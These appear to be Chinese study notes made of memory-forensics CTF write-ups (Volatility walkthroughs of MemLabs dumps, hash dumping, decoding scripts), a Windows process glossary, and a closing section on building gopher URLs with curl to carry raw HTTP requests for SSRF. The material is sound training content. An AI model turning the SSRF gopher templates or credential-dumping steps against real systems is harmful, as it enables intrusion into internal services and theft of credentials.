wdigest  WIN-9FBAEH4UV8C$ WORKGROUP   
```

#### 2.1.2 获取主机名和IP地址

```bash
# 获取IP地址
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 netscan 

# 获取主机名
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 printkey -K "ControlSet001\Control\ComputerName\ComputerName"
Volatility Foundation Volatility Framework 2.6.1
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: ComputerName (S)
Last updated: 2019-06-07 04:34:14 UTC+0000

Subkeys:

Values:
REG_SZ                        : (S) mnmsrvc
REG_SZ        ComputerName    : (S) WIN-9FBAEH4UV8C
```

#### 2.1.3 获取浏览器搜索过的关键词

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 iehistory                                                    
Volatility Foundation Volatility Framework 2.6.1
**************************************************
Process: 2208 explorer.exe
Cache type "DEST" at 0x4773e89
Last modified: 2019-06-07 13:44:58 UTC+0000
Last accessed: 2019-06-07 05:45:00 UTC+0000
URL: admin@file:///C:/Users/admin/Desktop/flag.txt
```

#### 2.1.4 获取挖矿程序的端口号和IP地址

这里说一下大致的排查流程，首先，通过`malfind`查找恶意程序，发现有多个`svchost.exe`程序，使用`pstree | grep "svchost.exe"`可以看到一个可疑程序，可以看到只有这个程序的PPID是不同的

![image-20231203154441111](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203154441111.png)

使用`malfind`再分析一次，确实能出现结果，一般到这一步就可以使用`procdump`将进程下载下来拿去做沙盒分析

![image-20231203154544637](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203154544637.png)

既然确定了恶意程序的PID值，那么就可以使用`netscan`来排查出地址和端口了

![image-20231203154729506](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203154729506.png)

#### 2.1.5 查找恶意进程注册服务

`volatility`可以用`svcscan`插件来查找具体的服务名称，由于恶意程序的PPID是3036，所以这里也可以推测出服务名为：`VMnetDHCP`

![image-20231203154929196](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203154929196.png)

### 2.2 MemLabs Labs

#### 2.2.1 MemLabs 新手关

> **Challenge Description**
>
> My friend John is an "environmental" activist and a humanitarian. He hated the ideology of Thanos from the Avengers: Infinity War. He sucks at programming. He used too many variables while writing any program. One day, John gave me a memory dump and asked me to find out what he was doing while he took the dump. Can you figure it out for me?
>
> Challenge file: [Google drive](https://drive.google.com/file/d/1MjMGRiPzweCOdikO3DTaVfbdBK5kyynT/view)

说实话，看来他的题目描述就跟没看一样

首先第一步肯定是先看进程信息的，这里不知道为什么`psscan`不可用，所以只能用`pslist`了，分析进程可以看出当前正在执行一下程序：

+ `VBoxService.exe`：virtual Box
+ `cmd.exe`：cmd 命令行
+ `SearchIndexer.exe`：好像还有一个文件搜素

![image-20231203165139814](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203165139814.png)

既然有`cmd.exe`，那么就可以先用`cmdscan`看看执行了哪些cmd命令，可以看到执行了一个python文件，我尝试过使用`dumpfies`下载文件，但是转存下来的文件却是空的

![image-20231203165413642](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203165413642.png)

使用`console`s查看运行了这个python文件之后的输出情况，拿到一串16进制字符串，直接解码是乱码

![image-20231203165827763](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203165827763.png)

这里再看一下环境变量能拿到下一个提示：`xor and password`

![image-20231203170009585](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203170009585.png)

那么对这串16进制字符串做一个异或运算爆破

```py
# 十六进制解码
src = bytes.fromhex("335d366f5d6031767631707f")

# 由于ASCII字符有8位，所以范围是 0-255
for i in range(0, 255):
    res = ''
    for j in src:
        res += chr(i ^ j)

    print(res)
    
# 结果：1_4m_b3tt3r}
```

提示里面还有一个`password`，那么将密码解密出来，这里`mimikatz`也用不了，对选定的NTLM哈希解密即可获取Flag

![image-20231203171338781](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203171338781.png)

#### 2.2.2 MemLabs Lab 1

> **Challenge description**
>
> My sister's computer crashed. We were very fortunate to recover this memory dump. Your job is get all her important files from the system. From what we remember, we suddenly saw a black window pop up with some thing being executed. When the crash happened, she was trying to draw something. Thats all we remember from the time of crash.
>
> **Note**: This challenge is composed of 3 flags.
>
> **Challenge file**: [MemLabs_Lab1](https://mega.nz/#!6l4BhKIb!l8ATZoliB_ULlvlkESwkPiXAETJEF7p91Gf9CWuQI70)

##### 2.2.2.1 初步分析

首先`pslist`配合`psscan`配合查看，这里将主要的进程提取出来讲

`cmd.exe`：cmd命令行

`mspaint.exe`：Windows画图工具

`WinRAR.exe`：解压软件

![image-20231203195226072](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203195226072.png)

##### 2.2.2.2 Flag1

首先先从最好入手的`cmd.exe`开始分析，先查看一下`cmd`历史记录

![image-20231203195421782](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203195421782.png)

没有看到什么有用的东西，`consoles`一下看看能不能看到cmd输出信息

![image-20231203195545122](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203195545122.png)

找到一串base64值，解码一下拿到第一个flag

![image-20231203195614084](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203195614084.png)

##### 2.2.2.3 Flag2

根据描述信息可知，要恢复画图软件的图片，因为电脑是在中途死机的，那么就是还没来得及保存，图片应该还是保存在内存中的，那么可以尝试使用`memdump`转存文件，并转位`data`后缀

`data`后缀文件可以代表任意的后缀文件，如：png、pdf、html等；只要保证以正确的打开方式打开即可

![image-20231203200132888](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203200132888.png)

使用`gimp`打开文件并调整位移、高度、宽度，最后垂直翻转一下即可还原图片

![image-20231203200650560](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203200650560.png)

##### 2.2.2.4 Flag3

现在就剩下最后一个Flag了，通过分析进程可知还有一个压缩包进程，那么尝试拿到这个压缩包文件

通过`cmdline`来查看进程程序的启动路径和参数，成功找到操作的文件对象

![image-20231203200903271](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203200903271.png)

全盘搜素这个文件并下载

![image-20231203201032186](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203201032186.png)

file 命令分析一下确实是一个压缩文件，解压缩的时候发现需要密码

![image-20231203201125807](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203201125807.png)

压缩软件打开能看到密码的提示信息，密码是`Alissa`用户的NTLM哈希值大写，那么直接用`hashdump`就可以了

![image-20231203201335804](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203201335804.png)

#### 2.2.3 MemLabs Lab 2

> 1.挑战说明
> 我们公司的一位客户由于未知错误而失去了对其系统的访问权限。 据推测，他是一位非常受欢迎的“环保”活动家。 作为调查的一部分，他告诉我们他的应用程序是浏览器，他的密码管理器等。我们希望你能深入这个内存转储并找到他的重要资料并将其归还给我们。
>
> 注意：此挑战由3个flag组成
>
> 靶机地址：https://github.com/stuxnet999/MemLabs/tree/master/Lab%202

##### 2.2.3.1 初步分析

关键进程：

`cmd`：命令行

`KeePass.exe`：密码管理器

`chrome.exe`：谷歌浏览器

![image-20231203215111534](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203215111534.png)

##### 2.2.3.2 Flag1

首先先用`psscan`和`pslist`做一个初步分析

![image-20231203214350115](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203214350115.png)

既然看到了`cmd.exe`那么就做一个常规查看咯！这里用`consoles`没有查看到什么有用的东西，`cmdscan`看到两个进程

![image-20231203214732996](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203214732996.png)

这里我实在想不通到底是基于怎样的逻辑去看环境变量的；解码这串base64值拿到第一个flag：`ZmxhZ3t3M2xjMG0zX1QwXyRUNGczXyFfT2ZfTDRCXzJ9`

![image-20231203214830472](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203214830472.png)

##### 2.2.3.3 Flag2

分析描述信息得到两个关键字：浏览器、密码管理器，那么首先想到`iehistory`

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/b461b194a7bc51751190430f56712aeb.png)

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/bd1545fa858fc4c5402898a240c43966.png)

全盘文件搜素这些文件，能够找到：`Password.png`还有`Hidden.kdbx`

![image-20231203215501282](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203215501282.png)

首先先转存`Password.png`文件，查看这个文件可以看到密码

![image-20231203215813915](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203215813915.png)

再转存`Hidden.kdbx`，这个程序应该要用KeyPass打开，这里我没做，输入上面的密码就可以打开，然后拿到Flag

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/b5647cf3c5dd716ae6a41e14fbaf2a1d.png)

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/1c5eeb9d9a4e8b631987642124ed2062.png)

##### 2.2.2.4 Flag3

查看Google浏览器的历史记录，这里需要额外加载插件

此处使用外部插件`chromehistory.py` 链接：`https://github.com/superponible/volatility-plugins`，发现可疑链接，访问就能拿到一个压缩包，解压密码为Lab-1中第三阶段Flag的sha1，且为小写。第三阶段Flag为：flag{w3ll_3rd_stage_was_easy}；密码为：`6045dd90029719a039fd2d2ebcca718439dd100a`

![image-20231203220101350](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203220101350.png)

#### 2.2.4 MemLabs Lab 3

> **挑战描述**
>
> 一个恶意脚本加密了我系统上一条非常机密的信息。你能帮我恢复信息吗？
>
> 注意：此挑战仅由1个标志组成，并分为2个部分。 提示：您需要标志的前半部分才能获得第二半部分。 您将需要这个额外的工具来解决挑战， 
>
> ```
> $ sudo apt install steghide
> ```

##### 2.2.4.1 初步分析

老规矩，先使用`pslist`和`psscan`来分析一下发生了什么，这里要把不知道的进程都查一次，首先可以看到有两个python进程，按照上一题的思路想看一下python进程的环境变量的。但是看不到

![image-20231203224722459](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203224722459.png)

![image-20231203224938621](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203224938621.png)

##### 2.2.4.2 Flag1

通过描述可以知道，是恶意脚本加密了信息。那么就可以认定这个脚本是一个python脚本了；这里可以使用`cmdline`来看看程序的执行参数，发现了两个可疑文件

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/136763985db7524d0b46dac8eda951f2.png)

全盘扫描并转存下来分析

![image-20231203225206557](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203225206557.png)

转存`evilscript.py`文件到本地并改名

![image-20231203225312495](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203225312495.png)

![image-20231203225337363](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203225337363.png)

这里贴一下脚本代码；整个脚本的意思是将输入的字符串逐位与数字3做一次异或运算，最后再全体做一次base64编码；然后写入`vip.txt`文件

```py
import sys
import string

def xor(s):
    a = ''.join(chr(ord(i)^3) for i in s)
    return a


def encoder(x):
    return x.encode("base64")


if __name__ == "__main__":
    f = open("C:\\Users\\hello\\Desktop\\vip.txt", "w")
    # sys.argv 是一个包含命令行参数的列表；sys.argv[0] 是脚本名（即被执行的脚本文件的路径），sys.argv[1] 到 sys.argv[n] 是传递给脚本的参数
    arr = sys.argv[1]
    arr = encoder(xor(arr))
    f.write(arr)
    f.close()
```

这里转存`vip.txt`文件并查看内容可以看到密文：`am1gd2V4M20wXGs3b2U=`

![image-20231203225725179](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203225725179.png)

既然如此，那么将脚本思路逆过来，先做一次base64解码，再逐位与数字3做一个异或运算就可以拿到明文，解密脚本如下：

```py
from base64 import b64decode

src = b64decode("am1gd2V4M20wXGs3b2U=").decode('utf-8')

res = ''
for i in src:
    res += ''.join(chr(ord(i) ^ 3))

print(res)

# 输出：
inctf{0n3_h4lf
```

##### 2.2.5.2 Flag2

通过提示知道需要用到`steghide`工具，该工具主要是对图片文件做隐写；利用这个思路全盘扫描图片文件

```
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/MemoryDump_Lab3.raw --profile=Win7SP1x86_23418 filescan |grep -E "jpg|jpeg|bmp|png"  
```

![image-20231203230058821](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203230058821.png)

直觉看上去`suspision1.jpeg`比较像，尝试解压一下，输入前半部分的flag当密码可以看到里面有一个`secret.txt`的文本文件

![image-20231203230304534](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203230304534.png)

直接解压出来，可以看到后半部分的Flag

![image-20231203230412811](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203230412811.png)

#### 2.2.5 MemLabs Lab 4

> **挑战说明**
>
> 我的系统最近遭到入侵。黑客窃取了很多信息，但他也删除了我的一个非常重要的文件。我不知道如何恢复它。目前，我们唯一的证据就是这个内存转储。请帮帮我。
>
> 注意：此挑战仅由1个标志组成。 
>
> 本练习的标志格式为：inctf{s0me_l33t_Str1ng}
>
> 靶机地址：https://github.com/stuxnet999/MemLabs/tree/master/Lab%204

##### 2.2.5.1 初步分析

explorer管理了 Windows的任务栏，资源管理器，文件窗口，并且大部分桌面程序都是explorer的子进程；即，我们在调用文件资源管理器来访问文件的时候都会用到这个进程，而且我们可以直接用`iehistory`来查看访问了哪些文件

**以后凡是看到`explore.exe`这个进程都给我去看`iehistory`**

![image-20231204155340348](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231204155340348.png)

##### 2.2.5.2 Flag1

一开始排查了很多东西到找不到线索，用`iehistory`可以看到一些可疑文件

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/cb35e372d13160bd511114205340d844.png)

使用`dumpfiles`在转载的时候全部都转不出来，描述说的是被删了；

对于NTFS文件系统，会有一个MFT表，单位为1024字节（1K），对于小于或等于1024字节的文件，NTFS会直接将这个文件记录到MFT表中；对于大于1024字节的文件，则会记录这个文件存储位置；即使删除了该文件，也只是将这个MFT条目标记为**可用（可覆盖）**，那么如果还没有被覆盖，就可以还原

使用`mftparser`来查看内存镜像的MFT表

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/MemoryDump_Lab4.raw --profile=Win7SP1x64 mftparser > mft.txt 
```

排查上面的可疑文件，在`important`关键字处找到Flag

![image-20231204160421910](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231204160421910.png)

#### 2.2.6 MemLabs Lab 5

> **挑战说明**
>
> 我们最近从客户那里收到了这个内存转储。有人在他不在时访问了他的系统，他发现正在访问一些相当奇怪的文件。 找到这些文件，它们可能很有用。我引用他的确切陈述，名字不可读。 它们由字母和数字组成，但我无法弄清楚它到底是什么。此外，他注意到他最喜欢的应用程序每次运行时都会崩溃。 是病毒吗？
>
> 注 1：此挑战由 3 个Flag组成。 如果您认为第二个标志是结束，它不是！
>
> 注 2：挑战时有一个小错误。 如果您发现任何具有字符串“L4B_3_D0n3!!”的字符串 在里面，请把它改成“L4B_5_D0n3!!” 然后继续。
>
> 注 3：只有在拥有第一阶段标志时，您才会获得第二阶段标志。

##### 2.2.6.1 初步分析

老规矩。`psscan`和`pslist`都一下，发现一些可疑进程

![image-20231204164540889](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231204164540889.png)

这里例举一下可疑进程

```bash
0x000000003e81ab30 NOTEPAD.EXE        1388   1580 0x00000000345fd000 2019-12-20 03:48:00 UTC+0000 
0x000000003fce8060 WerFault.exe       2716   2632 0x0000000033753000 2019-12-20 03:47:54 UTC+0000 
0x000000003fd97a20 WinRAR.exe         2924   1580 0x0000000023174000 2019-12-20 03:47:13 UTC+0000  
```

##### 2.2.6.2 Flag1

上一个关卡踩的坑，看到`explore.exe`首先检查`iehistory`，发现了下面这些可疑文件；Base64解码下面那一串字符串拿到第一个Flag

```bash
file:///C:/Users/Alissa%20Simpson/Documents/Important.rar
file:///C:/Users/Alissa%20Simpson/Downloads/SW1wb3J0YW50.rar		# Important.rar
file:///C:/Users/Alissa%20Simpson/stAg3_5.txt
file:///C:/Users/Alissa%20Simpson/Pictures/Password.png
file:///C:/Users/SmartNet/Documents/New%20Text%20Document.txt
file:///C:/Users/SmartNet/Secrets/Hidden.kdbx
file:///C:/Users/Alissa%20Simpson/Pictures/ZmxhZ3shIV93M0xMX2QwbjNfU3Q0ZzMtMV8wZl9MNEJfM19EMG4zXyEhfQ.bmp	# flag{!!_w3LL_d0n3_St4g3-1_0f_L4B_5_D0n3_!!}
file:///C:/Users/SmartNet/Desktop/St4g3$1.bat.txt
file:///C:/Users/SmartNet/Documents/New%20Text%20Document.txt
```

##### 2.2.6.3 Flag2

既然有`WinRAR.exe`进程，那么惯例肯定也是要把这个压缩包找出来的，上面找到了好几个压缩包文件名，全盘搜素一下，这里找到了`SW1wb3J0YW50.rar`文件

![image-20231204165047119](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231204165047119.png)

转存下来解压缩就可以发现第二个Flag，压缩包需要密码，尝试用第一条Flag解压成功，拿到下面一张图片

![image-20231204165149239](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231204165149239.png)

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231204165227755.png" alt="image-20231204165227755" style="zoom:50%;" />

##### 2.2.6.4 Flag3

根据描述信息，我第一反应是想办法将`WerFault.exe`报错的内容弄出来看；但是我用`procdump`存下来也打不开，这里因为需要二进制的知识了，直接贴吧

4.1 使用pstree发现可疑进程 NOTEPAD.EXE

vol.py -f /root/Desktop/memlabs/lab5/MemoryDump_Lab5.raw --profile=Win7SP1x64 pstree

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/f59a48903bf49e1bb6a962a06670ec89.png)

4.2 尝试提取Pid为2724和2056的程序，只有2724提取成功

vol.py -f /root/Desktop/memlabs/lab5/MemoryDump_Lab5.raw --profile=Win7SP1x64 procdump -p 2724 -D ../memlabs/lab5

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/2a8b293f45d746eff2491c3ded70b704.png)

4.3 使用IDA进行分析，取到Flag3，即bi0s{M3m_l4b5_OVeR_!}

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/2a963b896d4f9230b6dcbb482bdd6e85.png)

## 3. Windows 常见进程

在内存取证的时候经常会看到许多不认识的进程，这里将搜索过的进程做一个记录

```bash
SearchIndexer.exe					# 系统进程：Windows系统自带的文件搜索进程
smss.exe							# 系统进程：负责初始系统变量和启动用户会话（易被病毒利用）
wininit.exe							# 核心进程：负责Windows初始化（易被病毒利用）
services.exe						# 系统进程：管理、启动和重启服务（易被病毒利用）
lsass.exe							# 系统进程：用户明文会已明文的方式存储在这个进程中（易被病毒利用）
lsm.exe								# 系统进程：用户管理用户会话（易被病毒里利用）
svchost.exe							# 系统进程：动态链接库（DLL）中运行的服务的通用主机进程名称（易被病毒利用）
VBoxService.ex						# 程序进程：Virtual Box进程
VBoxTray.exe 						# 程序进程：属于Virtual Box程序的一部分
audiodg.exe 						# 系统进程：管理Windows系统音频程序
spoolsv.exe							# 系统进程：打印服务，管理所有本地和网络打印队列及控制所有打印工作
taskhost.exe						# 系统进程：Windows计划任务进程
taskeng.exe							# 系统进程：负责任务计划的执行和创建
sppsvc.exe							# 系统进程：用于检测安装和Windows应用程序的数字许可证
dwm.exe								# 系统进程：桌面窗口管理器，负责管理图形用户界面，如：透明窗口和任务栏缩略图
explorer.exe						# 核心进程：Windows资源管理器。包括开始菜单、任务栏、通知区域和文件资源管理器
conhost.exe							# 程序进程：命令行程序的宿主进程
DumpIt.exe							# 程序进程：DumpIt 程序用来封装系统的内存文件以作后续分析
csrss.exe							# 系统进程：主要管理Windows图形化相关的系统任务
TCPSVCS.EXE							# 系统进程：用于计算TCP/IP网络服务
wmpnetwk.exe						# 系统基础：Windows Media Player 网络共享服务
mspaint.exe							# 程序进程：Windows 画图程序的进程
winlogon.exe						# 系统进程：负责执行与Windows登录过程相关的一些重要任务
WmiPrvSE.exe | WmiApSrv.exe 		# 系统进程：帮助应用程序有关当前系统的各种信息
dllhost.exe							# 系统进程：用于管理DLL任务
KeePass.exe							# 程序进程：一个密码管理器
LogonUI.exe							# 系统进程：在登录时运行，用于构建并显示开机时的”欢迎“，密码输入、关机等界面
msiexec.exe							# 系统进程：主要用于Windows更新
TrustedInstall						# 系统进程：主要负责运行、安装、更新和卸载Windows系统组件
GoogleCrashHandler.exe				# 程序进程：包管理系统，可以下载、安装、删除和自动更新Google应用程序
StikyNot.exe 						# 程序进程：Windows系统的 Sticky Notes（便筏应用程序）
WerFault.exe						# 程序进程：Windows错误报告服务（WerSrv）的一部分，监视Windows和正在运行的应用程序状态。如果在启动应用程序时发生错误数据都会自动生成，则WerFault.exe进程将自动启动并手机错误报告数据
vmacthlp.exe | VGAuthService.exe	# 程序进程：是VMware Tools 软件包的一部分
msdtc.exe							# 系统进程：是 Windows 系统的一部分，具体来说是 Microsoft Distributed Transaction Coordinator (MSDTC) 服务的一部分。这项服务允许多个客户端应用程序在一个事务中包含多个不同的数据源。
BitTorrent.exe						# 程序进程：Torrent下载软件
MsMpEng.exe							# 程序进程：Win10 内置杀毒软件
msdtc.exe							# 系统进程：MSDTC 是 Windows 操作系统中的一个服务，用于支持分布式事务处理
NisSrv.exe							# 系统进程：与 Windows Defender（Microsoft Defender Antivirus）有关
sihost.exe							# 系统进程：是 Windows 桌面体验中的一个关键组件。它负责运行一些与用户界面、Windows资源管理器和任务栏相关的元件。
userinit.exe						# 系统进程：该进程负责初始化用户的登录会话。它在用户登录时运行，并负责执行一系列初始化任务，以确保用户会话的正确启动。
RuntimeBroker.exe					# 系统进程：充当应用程序与操作系统之间的中间代理，负责处理应用程序的权限请求、系统资源访问等。它确保应用程序在运行时获得适当的权限，同时限制其对系统资源的访问。
ChsIME.exe							# 系统进程：是输入法引擎的一部分，负责处理中文输入法的相关功能。
ShellExperienceHost.exe				# 系统进程：负责处理用户界面和桌面用户体验的相关功能
SearchUI.exe						# 系统进程：它与 Cortana 集成，允许用户在开始菜单或任务栏中进行搜索操作
ApplicationFrameHost.exe			# 系统进程：负责运行一些现代 UI 应用程序
SearchProtocolHost.exe				# 系统进程：负责执行搜索操作，包括文件和应用程序搜索
SearchFilterHost.exe				# 系统进程：负责处理搜索过滤器和索引策略。它帮助加快文件搜索的速度，提高搜索效率。
```

# gopher 协议

## 一、什么是gopher协议？

**定义**：Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；

> gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议

**限制**：gopher协议在各个编程语言中的使用限制

![img](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/v2-ea9bb9538044933ac3c918d5a56f2d69_1440w.webp)

**Gopher协议格式**：

```php
URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流
```

- gopher的默认端口是70
- 如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&也需要进行URL编码

**Gopher发送请求HTTP GET请求：**

使用Gopher协议发送一个请求，环境为：nc起一个监听，curl发送gopher请求

nc启动监听，监听2333端口：nc -lp 2333

使用curl发送http请求，命令为

```php
margine:~ margin$ curl gopher://192.168.0.119:2333/abcd
```

此时nc收到的消息为：

```bash
margine:~ margin$ nc -lp 2333
bcd
```

可以发现url中的a没有被nc接受到，如果命令变为

```text
margine:~ margin$ curl gopher://192.168.0.119:2333/_abcd
```

此时nc收到的消息为：

```text
margine:~ margin$ nc -lp 2333
abcd
```

所以需要在使用gopher协议时在url后加入一个字符（该字符可随意写）

那么如何发送HTTP的请求呢？例如GET请求。此时我们联想到，直接发送一个原始的HTTP包不就可以吗？在gopher协议中发送HTTP的数据，需要以下三步：

> 1、构造HTTP数据包
> 2、URL编码、替换回车换行为%0d%0a
> 3、发送gopher协议

我准备了一个PHP的代码，如下：

```php
<?php
    echo "Hello ".$_GET["name"]."\n"
?>
```

一个GET型的HTTP包，如下：

```http
GET /index.php HTTP/1.1
Host: 192.168.231.153:8000
```

URL编码后为：

```http
curl gopher://192.168.231.153:8000/_GET%20/index.php%3fname=Jack%20HTTP/1.1%0d%0AHost:%20192.168.231.153%0d%0A
```

> 在转换为URL编码时候有这么几个坑
>
> 1、问号（？）需要转码为URL编码，也就是%3f
>
> 2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a
>
> 4、空格也要转换为%20
>
> 5、这里除了回车、空格、换行之外，其他字符一律不做转换
>
> 5、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）

**Gopher发送请求HTTP POST请求：**

发送POST请求前，先看下POST数据包的格式；对于一个完整的HTTP POST请求，以下4个字段是必备的，否则服务端是解析不出来的

```http
POST /index.php HTTP/1.1
Host: 192.168.231.153:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

name=Jack
```

post.php的代码为

```text
<?php
    echo "Hello ".$_POST["name"]."\n"
?>
```

URL编码为：

```bash
curl gopher://192.168.231.153:8000/_POST%20/index.php%20HTTP/1.1%0d%0aHost:%20192.168.231.153%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2013%0d%0a%0d%0aname=Jack%0d%0a
```

